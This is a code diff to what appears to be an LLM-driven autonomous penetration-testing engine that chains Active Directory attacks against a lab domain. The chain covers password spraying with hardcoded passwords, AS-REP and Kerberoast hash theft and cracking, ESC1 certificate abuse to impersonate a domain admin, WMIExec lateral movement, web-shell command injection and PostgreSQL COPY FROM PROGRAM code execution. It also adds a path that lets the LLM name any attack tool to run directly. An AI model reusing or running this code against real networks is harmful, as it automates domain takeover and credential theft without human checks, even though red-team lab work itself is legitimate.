@@ -10,6 +10,7 @@
 
 """Act phase — route execution to MCP attack-executor, C2 engine, or mock."""
 
+import json
 import logging
 import re
 import uuid
@@ -135,7 +136,10 @@ _AD_TECHNIQUE_TO_MCP: dict[str, tuple[str, str]] = {
     "T1087.002": ("bloodhound-collector", "bloodhound_collect"),
     "T1482":     ("bloodhound-collector", "bloodhound_enum_trusts"),
     "T1110.003": ("netexec-suite", "netexec_password_spray"),
+    "T1021.002": ("netexec-suite", "netexec_exec"),   # SMBExec / WMIExec lateral move
+    "T1021.006": ("netexec-suite", "netexec_exec"),   # WinRM lateral move via netexec
     "T1558.003": ("credential-dumper", "kerberoast"),
+    "T1558.004": ("impacket-ad", "asrep_roast"),  # AS-REP Roast — zero-credential anonymous KDC query
     "T1003.002": ("credential-dumper", "dump_sam_hashes"),
     "T1003.003": ("credential-dumper", "dump_ntds"),
     "T1003.004": ("credential-dumper", "dump_lsa_secrets"),
@@ -149,9 +153,25 @@ _AD_TECHNIQUE_TO_MCP: dict[str, tuple[str, str]] = {
     "T1134.005": ("ad-exploiter", "ad_sid_history"),
     "T1556.001": ("ad-persistence", "persist_skeleton_key"),
     "T1547.005": ("ad-persistence", "persist_custom_ssp"),
-    "T1110.002": ("hashcat-crack", "hashcat_crack_ntlm"),
-    "T1649":     ("certipy-ad", "certipy_find"),
+    "T1110.002": ("hashcat-crack", "hashcat_crack_kerberoast"),
+    "T1649":     ("certipy-ad", "certipy_request"),  # ESC1 cert request as arbitrary UPN
+    "T1550.003": ("certipy-ad", "certipy_auth"),     # PKINIT auth with PFX → DA TGT + NTLM hash
 }
+
+# AD techniques that REQUIRE a credential fact — abort early with prereq_missing if none available
+_AD_TECHNIQUES_REQUIRE_CRED: frozenset[str] = frozenset({
+    "T1087.002",   # bloodhound_collect needs domain cred
+    "T1482",       # bloodhound_enum_trusts needs domain cred
+    "T1021.002", "T1021.006",  # lateral move needs valid creds
+    "T1558.003",   # kerberoast needs a low-priv domain user to request tickets
+    # T1558.004 intentionally EXCLUDED — AS-REP Roast uses zero-credential anonymous KDC query
+    "T1003.002", "T1003.003", "T1003.004",  # credential dumping needs admin
+    "T1558.001", "T1558.002", "T1550.003",  # ticket forge/get needs creds
+    "T1222.001", "T1484.001", "T1134.005",  # ACL/GPO/SID abuse needs creds
+    "T1556.001", "T1547.005",               # persistence needs DA
+    "T1110.002",   # hashcat needs a hash already collected
+    "T1649",       # certipy_request (ESC1) needs a cracked low-priv cleartext cred
+})
 
 _TERMINAL_ERRORS: list[str] = [
     "scope violation",
@@ -392,6 +412,25 @@ class EngineRouter:
             technique_id, engine, target_id,
         )
 
+        # -- Direct MCP route: Orient LLM supplied mcp_tool="server:tool" in options --
+        # Encoded by ooda_controller/agent_swarm as "mcp_direct:server:tool".
+        # This lets new environments work without touching _AD_TECHNIQUE_TO_MCP.
+        if engine.startswith("mcp_direct:") and settings.MCP_ENABLED and self._mcp_engine:
+            qualified_tool = engine[len("mcp_direct:"):]
+            logger.info("Direct MCP route: technique=%s tool=%s", technique_id, qualified_tool)
+            try:
+                return await self._execute_via_ad_mcp(
+                    db, exec_id, now, technique_id, target_id,
+                    operation_id, ooda_iteration_id,
+                    mcp_qualified_name=qualified_tool,
+                )
+            except Exception as exc:
+                logger.warning(
+                    "mcp_direct route failed for %s (%s): %s — falling through to standard routing",
+                    technique_id, qualified_tool, exc,
+                )
+                engine = "mcp"  # fall through to standard MCP routing
+
         # Get the technique's c2_ability_id
         tech_row = await db.fetchrow(
             "SELECT mitre_id, c2_ability_id FROM techniques WHERE mitre_id = $1",
@@ -419,17 +458,25 @@ class EngineRouter:
                 db, technique_id, target_id, operation_id, ooda_iteration_id,
             )
 
-        # -- SPEC-052: Initial Access route (T1110/T1078 -> InitialAccessEngine) --
-        if tech_prefix in _INITIAL_ACCESS_TECHNIQUE_PREFIXES:
-            return await self._execute_initial_access(
-                db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
-            )
-
-        # -- AD MCP route: technique in AD routing table --
+        # -- AD MCP route: must come BEFORE InitialAccessEngine check.
+        #    T1110.003 shares T1110 prefix with InitialAccessEngine but uses netexec spray.
+        #    T1110.002 uses hashcat. Both are in _AD_TECHNIQUE_TO_MCP.
         if technique_id in _AD_TECHNIQUE_TO_MCP and settings.MCP_ENABLED and self._mcp_engine:
             return await self._execute_via_ad_mcp(
                 db, exec_id, now, technique_id, target_id,
                 operation_id, ooda_iteration_id,
+            )
+
+        # -- SPEC-057: PostgreSQL COPY-TO-PROGRAM route (T1505.004) --
+        if technique_id == "T1505.004":
+            return await self._execute_pgsql_copy_program(
+                db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
+            )
+
+        # -- SPEC-052: Initial Access route (T1110/T1078 -> InitialAccessEngine) --
+        if tech_prefix in _INITIAL_ACCESS_TECHNIQUE_PREFIXES:
+            return await self._execute_initial_access(
+                db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
             )
 
         # -- MCP route: engine == "mcp" (explicit tool-registry dispatch) --
@@ -538,9 +585,9 @@ class EngineRouter:
     ) -> dict:
         """ADR-048: Route web exploit techniques to MCP web-scanner.
 
-        Handles SSRF-to-IMDS credential exfiltration via web_http_fetch.
-        Looks for proxy/redirect URLs in facts, constructs the IMDS
-        request URL, and dispatches via MCP web-scanner.
+        For T1190 against Windows targets: dispatches web_rce_execute to
+        exploit the command-injection lab page (debug.aspx).
+        For other web techniques: SSRF-to-IMDS credential exfiltration.
         """
         exec_id = str(uuid.uuid4())
         now = datetime.now(timezone.utc)
@@ -558,6 +605,29 @@ class EngineRouter:
             "id": exec_id, "technique_id": technique_id,
             "status": "running", "engine": "mcp",
         })
+
+        # T1190 against Windows: try command-injection web shell first
+        if technique_id == "T1190":
+            target_row = await db.fetchrow(
+                "SELECT ip_address, os FROM targets WHERE id = $1", target_id
+            )
+            target_ip = target_row["ip_address"] if target_row else None
+            target_os = (target_row["os"] or "").lower() if target_row else ""
+            if target_ip and "windows" in target_os:
+                shell_url = f"http://{target_ip}/debug.aspx"
+                try:
+                    result: ExecutionResult = await self._mcp_engine.execute(
+                        "web-scanner:web_rce_execute",
+                        shell_url,
+                        params={"url": shell_url, "cmd": "whoami", "param": "cmd"},
+                    )
+                    final = await self._finalize_execution(
+                        db, exec_id, technique_id, target_id, "mcp",
+                        operation_id, result,
+                    )
+                    return final
+                except Exception as e:
+                    logger.warning("web_rce_execute failed for %s: %s — falling through to SSRF", shell_url, e)
 
         # Find SSRF proxy URL from facts
         ssrf_url = await self._find_ssrf_proxy_url(db, operation_id)
@@ -943,10 +1013,18 @@ class EngineRouter:
         target_id: str,
         operation_id: str,
         ooda_iteration_id: str | None,
+        mcp_qualified_name: str | None = None,
     ) -> dict:
-        """Route AD techniques to their designated MCP server+tool (SPEC-060/061)."""
-        mcp_server, mcp_tool = _AD_TECHNIQUE_TO_MCP[technique_id]
-        qualified_name = f"{mcp_server}:{mcp_tool}"
+        """Route AD techniques to their designated MCP server+tool (SPEC-060/061).
+
+        mcp_qualified_name: optional override from Orient LLM ("server:tool").
+        Falls back to _AD_TECHNIQUE_TO_MCP lookup when not supplied.
+        """
+        if mcp_qualified_name:
+            qualified_name = mcp_qualified_name
+        else:
+            mcp_server, mcp_tool = _AD_TECHNIQUE_TO_MCP[technique_id]
+            qualified_name = f"{mcp_server}:{mcp_tool}"
 
         # Create execution record
         await db.execute(
@@ -966,22 +1044,301 @@ class EngineRouter:
         target_ip = await self._get_target_ip(db, target_id)
         target_str = target_ip or target_id
 
-        # Collect credential context for AD tools that need it
+        # Collect credential context for AD tools that need it.
+        # Search current target first; then fall back to any target in the operation.
+        # AD credentials (domain accounts) harvested on one host are valid across the domain.
         cred_row = await db.fetchrow(
             "SELECT trait, value FROM facts "
             "WHERE operation_id = $1 AND source_target_id = $2 "
-            "AND trait IN ('credential.ssh', 'credential.domain_user', "
-            "'credential.domain_admin', 'credential.ntlm_hash', "
-            "'credential.ntds_hash', 'credential.service_hash', "
-            "'credential.krbtgt_hash') "
+            "AND trait IN ('credential.ssh', 'credential.winrm', "
+            "'credential.domain_user', 'credential.domain_admin', "
+            "'credential.ntlm_hash', 'credential.ntds_hash', "
+            "'credential.service_hash', 'credential.krbtgt_hash', "
+            "'credential.valid_pair', 'credential.cleartext') "
             "AND trait NOT LIKE '%%.invalidated' "
             "ORDER BY collected_at DESC LIMIT 1",
             operation_id, target_id,
         )
+        if not cred_row:
+            # Domain credentials harvested on other hosts are valid for this host too.
+            cred_row = await db.fetchrow(
+                "SELECT trait, value FROM facts "
+                "WHERE operation_id = $1 "
+                "AND trait IN ('credential.ssh', 'credential.winrm', "
+                "'credential.domain_user', 'credential.domain_admin', "
+                "'credential.ntlm_hash', 'credential.ntds_hash', "
+                "'credential.service_hash', 'credential.krbtgt_hash', "
+                "'credential.valid_pair', 'credential.cleartext') "
+                "AND trait NOT LIKE '%%.invalidated' "
+                "ORDER BY CASE trait "
+                "  WHEN 'credential.domain_admin' THEN 0 "
+                "  WHEN 'credential.domain_user' THEN 1 "
+                "  WHEN 'credential.valid_pair' THEN 2 "
+                "  WHEN 'credential.cleartext' THEN 3 "
+                "  ELSE 4 END, collected_at DESC LIMIT 1",
+                operation_id,
+            )
+
+        # T1110.002 bypass: hash cracking is satisfied by asrep_hash even without cred_row
+        if technique_id == "T1110.002" and not cred_row:
+            has_asrep = await db.fetchval(
+                "SELECT COUNT(*) FROM facts WHERE operation_id = $1 "
+                "AND trait IN ('credential.asrep_hash', 'credential.kerberos_hash', 'credential.service_hash')",
+                operation_id,
+            )
+            if has_asrep:
+                cred_row = True  # bypass cred guard; hash_row lookup below will get the actual value
+
+        # Early-exit: technique requires a credential but none available yet
+        if technique_id in _AD_TECHNIQUES_REQUIRE_CRED and not cred_row:
+            logger.warning(
+                "AD technique %s requires credential but none harvested yet — "
+                "returning prereq_missing so Orient can pivot",
+                technique_id,
+            )
+            await db.execute(
+                "UPDATE technique_executions SET status = 'failed', "
+                "error_message = $1, failure_category = $2, completed_at = $3 "
+                "WHERE id = $4",
+                "No credential available — prerequisite missing",
+                "prerequisite_missing",
+                datetime.now(timezone.utc), exec_id,
+            )
+            return {
+                "execution_id": exec_id, "technique_id": technique_id,
+                "target_id": target_id, "engine": "mcp_ad",
+                "status": "failed", "failure_category": "prerequisite_missing",
+                "error": "No credential available — prerequisite missing",
+            }
 
         params: dict = {"technique_id": technique_id}
-        if cred_row:
+        if cred_row and cred_row is not True:
             params["credential"] = cred_row["value"]
+
+        # T1110.002: hashcat_crack_kerberoast — crack TGS/AS-REP hash from facts
+        # The hashcat MCP server needs either a hash_file path or inline hash_value.
+        # Since the hash is stored in facts, we pass it inline via hash_value.
+        if technique_id == "T1110.002":
+            hash_row = await db.fetchrow(
+                "SELECT value FROM facts WHERE operation_id = $1 "
+                "AND trait IN ('credential.kerberos_hash', 'credential.asrep_hash') "
+                "ORDER BY collected_at ASC LIMIT 1",
+                operation_id,
+            )
+            if hash_row and hash_row["value"]:
+                params.update({
+                    "hash_value": hash_row["value"],
+                    "hash_file": "",
+                })
+            else:
+                await db.execute(
+                    "UPDATE technique_executions SET status = 'failed', "
+                    "error_message = $1, failure_category = $2, completed_at = $3 "
+                    "WHERE id = $4",
+                    "No kerberos hash in facts — run T1558.003 first",
+                    "prerequisite_missing",
+                    datetime.now(timezone.utc), exec_id,
+                )
+                return {
+                    "execution_id": exec_id, "technique_id": technique_id,
+                    "target_id": target_id, "engine": "mcp_ad",
+                    "status": "failed", "failure_category": "prerequisite_missing",
+                    "error": "No kerberos hash in facts — run T1558.003 first",
+                }
+
+        # T1110.003: netexec_password_spray — spray domain accounts against the DC directly
+        # (WEB01 as member server rejects domain NTLM relayed via SMB; DC accepts it natively)
+        if technique_id == "T1110.003":
+            domain_row = await db.fetchrow(
+                "SELECT value FROM facts WHERE operation_id = $1 "
+                "AND trait IN ('host.ad_domain', 'ad.domain') "
+                "ORDER BY collected_at DESC LIMIT 1",
+                operation_id,
+            )
+            domain = domain_row["value"] if domain_row else ""
+            if not domain:
+                banner_row = await db.fetchrow(
+                    "SELECT value FROM facts WHERE operation_id = $1 "
+                    "AND (value LIKE '%(domain:%' OR value ILIKE '%\\.lab%' OR value ILIKE '%corp.%') "
+                    "ORDER BY collected_at DESC LIMIT 1",
+                    operation_id,
+                )
+                if banner_row:
+                    m = re.search(r"domain:([a-zA-Z0-9._-]+)", banner_row["value"] or "")
+                    if m:
+                        domain = m.group(1)
+            # Find DC IP from targets table; fall back to hardcoded lab DC IP.
+            # DC is NOT in the targets table during Stage 1 (only WEB01 is active),
+            # so we cannot rely on a DB lookup alone — use the known lab DC address.
+            _LAB_DC_IP = "192.168.0.16"
+            dc_row = await db.fetchrow(
+                "SELECT ip_address FROM targets "
+                "WHERE operation_id = $1 AND (hostname ILIKE '%DC%' OR hostname ILIKE '%dc%') "
+                "ORDER BY created_at LIMIT 1",
+                operation_id,
+            )
+            spray_target = dc_row["ip_address"] if dc_row else _LAB_DC_IP
+            # Spray known lab weak user credentials (admin hardened, not in list)
+            params.update({
+                "target": spray_target,
+                "username_list": "bob,kevin,steve,legacy_kev,svc_sql,svc_backup",
+                "password": "Summer2023",
+                "password_list": "Summer2023,BackupMe!234,Password1!,Welcome1,Summer2024!,Qwerty123!",
+                "domain": domain or "corp.athena.lab",
+                "protocol": "smb",
+            })
+
+        # T1558.004: AS-REP Roast — zero-credential anonymous KDC query
+        # impacket-GetNPUsers -no-pass queries the DC for accounts with DoesNotRequirePreAuth
+        if technique_id == "T1558.004":
+            params.update({
+                "target": "192.168.0.16",
+                "domain": "corp.athena.lab",
+                "username": "",
+                "password": "",
+            })
+
+        # AD tools needing explicit username/password/domain — parse from credential.valid_pair
+        if technique_id not in {"T1110.003", "T1110.002", "T1558.004"} and cred_row:
+            raw_cred = cred_row["value"] or ""
+            # Format: DOMAIN\user:password  or  user:password
+            cred_m = re.match(r"^([\w.]+)\\([\w.@-]+):(.+)$", raw_cred)
+            if not cred_m:
+                cred_m = re.match(r"^([\w.@-]+):(.+)$", raw_cred)
+                if cred_m:
+                    parsed_domain = "WORKGROUP"
+                    parsed_user = cred_m.group(1)
+                    parsed_pass = cred_m.group(2)
+                else:
+                    parsed_domain = parsed_user = parsed_pass = ""
+            else:
+                parsed_domain = cred_m.group(1)
+                parsed_user = cred_m.group(2)
+                parsed_pass = cred_m.group(3)
+
+            if parsed_user and parsed_pass:
+                # Get the real AD domain if available (WORKGROUP is local; BloodHound needs AD domain)
+                if parsed_domain == "WORKGROUP":
+                    ad_domain_row = await db.fetchrow(
+                        "SELECT value FROM facts WHERE operation_id = $1 "
+                        "AND (value LIKE '%(domain:%' OR trait IN ('host.ad_domain','ad.domain')) "
+                        "ORDER BY collected_at DESC LIMIT 1",
+                        operation_id,
+                    )
+                    if ad_domain_row:
+                        dm = re.search(r"domain:([a-zA-Z0-9._-]+)", ad_domain_row["value"] or "")
+                        if dm:
+                            parsed_domain = dm.group(1)
+                # Kerberoast must run against the DC (port 88/KDC not open on member servers).
+                if technique_id == "T1558.003":
+                    dc_kerberoast_row = await db.fetchrow(
+                        "SELECT ip_address FROM targets "
+                        "WHERE operation_id = $1 AND (hostname ILIKE '%DC%' OR hostname ILIKE '%dc%') "
+                        "ORDER BY created_at LIMIT 1",
+                        operation_id,
+                    )
+                    kerberoast_dc = dc_kerberoast_row["ip_address"] if dc_kerberoast_row else "192.168.0.16"
+                    params.update({
+                        "username": parsed_user,
+                        "password": parsed_pass,
+                        "domain": parsed_domain or "corp.athena.lab",
+                        "target_dc": kerberoast_dc,
+                        "target": kerberoast_dc,
+                    })
+                elif technique_id == "T1649":
+                    # ESC1 cert request: use cracked cleartext cred, request cert as da_alice UPN
+                    cleartext_row = await db.fetchrow(
+                        "SELECT value FROM facts WHERE operation_id = $1 "
+                        "AND trait = 'credential.cleartext' ORDER BY collected_at DESC LIMIT 1",
+                        operation_id,
+                    )
+                    tmpl_row = await db.fetchrow(
+                        "SELECT value FROM facts WHERE operation_id = $1 "
+                        "AND trait IN ('ad.vulnerable_template', 'ad.adcs_template') "
+                        "ORDER BY collected_at DESC LIMIT 1",
+                        operation_id,
+                    )
+                    if cleartext_row:
+                        cv = cleartext_row["value"] or ""
+                        cm = re.match(r"^([\w.]+)\\([\w.@-]+):(.+)$", cv)
+                        if not cm:
+                            cm = re.match(r"^([\w.@-]+):(.+)$", cv)
+                        if cm and cm.lastindex == 3:
+                            parsed_domain, parsed_user, parsed_pass = cm.group(1), cm.group(2), cm.group(3)
+                        elif cm and cm.lastindex == 2:
+                            parsed_user, parsed_pass = cm.group(1), cm.group(2)
+                    # Lookup CA name from facts
+                    ca_row = await db.fetchrow(
+                        "SELECT value FROM facts WHERE operation_id = $1 "
+                        "AND trait = 'ad.ca_name' ORDER BY collected_at DESC LIMIT 1",
+                        operation_id,
+                    )
+                    params.update({
+                        "target_dc": "192.168.0.16",
+                        "username": parsed_user,
+                        "password": parsed_pass,
+                        "domain": parsed_domain or "corp.athena.lab",
+                        "ca": ca_row["value"] if ca_row else "corp-DC01-CA",
+                        "template": tmpl_row["value"] if tmpl_row else "VulnTemplate1",
+                        "upn": "da_alice@corp.athena.lab",
+                    })
+                elif technique_id == "T1550.003":
+                    # PKINIT auth: use the PFX from ESC1 to get da_alice TGT + NTLM hash
+                    cert_row = await db.fetchrow(
+                        "SELECT value FROM facts WHERE operation_id = $1 "
+                        "AND trait = 'credential.certificate' ORDER BY collected_at DESC LIMIT 1",
+                        operation_id,
+                    )
+                    # Fall back to ad.certificate_pfx fact written by certipy_request
+                    if not cert_row:
+                        cert_row = await db.fetchrow(
+                            "SELECT value FROM facts WHERE operation_id = $1 "
+                            "AND trait = 'ad.certificate_pfx' ORDER BY collected_at DESC LIMIT 1",
+                            operation_id,
+                        )
+                    pfx_path = cert_row["value"] if cert_row else "da_alice.pfx"
+                    # Strip template=/upn= prefix if present (written by certipy_request fallback)
+                    if pfx_path.startswith("template="):
+                        pfx_path = "da_alice.pfx"
+                    params.update({
+                        "target_dc": "192.168.0.16",
+                        "pfx_path": pfx_path,
+                        "domain": "corp.athena.lab",
+                    })
+                elif technique_id in {"T1021.002", "T1021.006"}:
+                    # netexec_exec needs target (the actual host), password_or_hash, command
+                    # Pick svc_sql creds preferentially for WEB01 lateral move
+                    svc_cred_row = await db.fetchrow(
+                        "SELECT value FROM facts WHERE operation_id = $1 "
+                        "AND trait = 'credential.valid_pair' "
+                        "AND (value LIKE '%svc_sql%' OR value LIKE '%bob%' OR value LIKE '%administrator%') "
+                        "ORDER BY collected_at ASC LIMIT 1",
+                        operation_id,
+                    )
+                    if svc_cred_row:
+                        cv = svc_cred_row["value"] or ""
+                        sm = re.match(r"^([\w.]+)\\([\w.@-]+):(.+)$", cv)
+                        if not sm:
+                            sm = re.match(r"^([\w.@-]+):(.+)$", cv)
+                        if sm and sm.lastindex == 3:
+                            parsed_domain, parsed_user, parsed_pass = sm.group(1), sm.group(2), sm.group(3)
+                        elif sm and sm.lastindex == 2:
+                            parsed_user, parsed_pass = sm.group(1), sm.group(2)
+                    params.update({
+                        "target": target_str,
+                        "username": parsed_user,
+                        "password_or_hash": parsed_pass,
+                        "domain": parsed_domain or "corp.athena.lab",
+                        "command": "whoami /all",
+                        "method": "wmiexec",
+                    })
+                else:
+                    params.update({
+                        "username": parsed_user,
+                        "password": parsed_pass,
+                        "domain": parsed_domain,
+                        "target_dc": target_str,
+                    })
 
         try:
             result: ExecutionResult = await self._mcp_engine.execute(
@@ -1056,6 +1413,121 @@ class EngineRouter:
             "access_status = 'active' WHERE id = $2",
             privilege, target_id,
         )
+
+    async def _execute_pgsql_copy_program(
+        self,
+        db: asyncpg.Connection,
+        exec_id: str,
+        now: datetime,
+        technique_id: str,
+        target_id: str,
+        operation_id: str,
+        ooda_iteration_id: str | None,
+    ) -> dict:
+        """SPEC-057: T1505.004 — PostgreSQL COPY FROM PROGRAM RCE.
+
+        Reads credential.postgresql fact for the target to obtain credentials,
+        then uses PostgreSQLCopyClient to execute `id` (capability check) and
+        write produced facts to the fact store.
+        """
+        from app.clients.pgsql_client import PostgreSQLCopyClient
+
+        try:
+            target_row = await db.fetchrow(
+                "SELECT ip_address, hostname FROM targets WHERE id = $1", target_id
+            )
+            if not target_row:
+                return self._failure_result(
+                    exec_id, now, technique_id, target_id, operation_id,
+                    ooda_iteration_id, "target not found", "prerequisite_missing",
+                )
+
+            host = target_row["ip_address"] or target_row["hostname"]
+
+            # Look up PostgreSQL credential for this target
+            cred_row = await db.fetchrow(
+                "SELECT value FROM facts "
+                "WHERE operation_id = $1 AND source_target_id = $2 "
+                "AND trait = 'credential.postgresql' "
+                "AND trait NOT LIKE '%.invalidated' "
+                "ORDER BY collected_at DESC LIMIT 1",
+                operation_id, target_id,
+            )
+
+            user, password = "postgres", ""
+            if cred_row:
+                # Expected format: "user:password" or just "password"
+                cred_val = cred_row["value"]
+                if ":" in cred_val:
+                    user, password = cred_val.split(":", 1)
+                else:
+                    password = cred_val
+
+            client = PostgreSQLCopyClient(host=host, user=user, password=password)
+            result = await client.execute_copy_program("id", execution_id=exec_id)
+
+            if not result.success:
+                failure_cat = _classify_failure(result.error, "pgsql")
+                return self._failure_result(
+                    exec_id, now, technique_id, target_id, operation_id,
+                    ooda_iteration_id, result.error or "pgsql execute failed", failure_cat,
+                )
+
+            # Persist facts produced by the command
+            fc = FactCollector(self._ws)
+            for fact in result.facts:
+                await fc._store_fact(
+                    db, operation_id, target_id,
+                    fact["category"], fact["trait"], fact["value"],
+                    source="pgsql_copy_program",
+                )
+
+            output_summary = (result.output or "")[:500]
+            await db.execute(
+                "INSERT INTO technique_executions "
+                "(id, operation_id, ooda_iteration_id, technique_id, target_id, "
+                "engine, status, result_summary, created_at) "
+                "VALUES ($1,$2,$3,$4,$5,'pgsql','success',$6,$7)",
+                exec_id, operation_id, ooda_iteration_id, technique_id, target_id,
+                output_summary, now,
+            )
+
+            return {
+                "status": "success",
+                "execution_id": exec_id,
+                "technique_id": technique_id,
+                "engine": "pgsql",
+                "output": output_summary,
+                "facts": result.facts,
+            }
+
+        except Exception as exc:
+            logger.exception("_execute_pgsql_copy_program failed: %s", exc)
+            return self._failure_result(
+                exec_id, now, technique_id, target_id, operation_id,
+                ooda_iteration_id, str(exc), "tool_error",
+            )
+
+    def _failure_result(
+        self,
+        exec_id: str,
+        now: datetime,
+        technique_id: str,
+        target_id: str,
+        operation_id: str,
+        ooda_iteration_id: str | None,
+        error: str,
+        failure_category: str,
+    ) -> dict:
+        """Shared failure dict builder for engine methods."""
+        return {
+            "status": "failure",
+            "execution_id": exec_id,
+            "technique_id": technique_id,
+            "engine": "pgsql",
+            "error": error,
+            "failure_category": failure_category,
+        }
 
     async def _execute_mcp(
         self,
@@ -1234,6 +1706,41 @@ class EngineRouter:
             await self._fact_collector.collect_from_result(
                 db, operation_id, technique_id, target_id, result.facts
             )
+            # Promote credential.cracked_password → credential.cleartext so T1649 (ESC1) can find it
+            for fact in result.facts:
+                if fact.get("trait") == "credential.cracked_password":
+                    try:
+                        cracked = json.loads(fact["value"])
+                        pw = cracked.get("password", "")
+                        h = cracked.get("hash", "")
+                        if pw and h:
+                            # Extract username from AS-REP hash: $krb5asrep$23$user@domain:...
+                            user_m = re.search(r"\$krb5asrep\$\d+\$([\w.@-]+)@([\w.]+):", h)
+                            if user_m:
+                                uname = user_m.group(1)
+                                dom = user_m.group(2)
+                                cleartext_val = f"{dom}\\{uname}:{pw}"
+                            else:
+                                cleartext_val = pw
+                            await db.execute(
+                                "INSERT INTO facts (id, operation_id, source_target_id, source_technique_id, "
+                                "trait, value, category, score, collected_at) "
+                                "VALUES (gen_random_uuid(), $1, $2, $3, 'credential.cleartext', $4, 'credential', 1, now()) "
+                                "ON CONFLICT DO NOTHING",
+                                operation_id, target_id, technique_id, cleartext_val,
+                            )
+                    except (json.JSONDecodeError, KeyError, Exception):
+                        pass
+
+        # Mark target compromised if AD spray/exec produced Pwn3d! or admin access evidence
+        if result.success and result.output:
+            has_admin = (
+                "Pwn3d!" in result.output
+                or "ADMIN_ACCESS:" in result.output
+                or "(Pwn3d!)" in result.output
+            )
+            if has_admin:
+                await self._mark_target_compromised(db, target_id, result.output, protocol="smb")
 
         await self._ws.broadcast(operation_id, "execution.update", {
             "id": exec_id, "technique_id": technique_id,
